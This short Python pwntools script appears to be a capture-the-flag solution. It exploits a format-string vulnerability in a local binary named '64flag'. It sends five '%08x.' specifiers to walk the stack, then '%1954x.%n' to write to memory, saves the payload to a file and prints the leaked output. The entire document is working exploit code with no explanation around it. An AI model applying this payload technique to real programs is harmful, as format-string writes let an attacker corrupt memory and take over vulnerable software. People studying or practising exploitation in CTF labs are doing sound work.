#!/usr/bin/python
from pwn import *
p = process('64flag')
fs = "%08x."+"%08x."+"%08x."+"%08x."+"%08x."+"%1954x.%n"
p.sendline(fs)
f = open('f','w')
f.write(fs)
f.close()
print p.read().split('.')
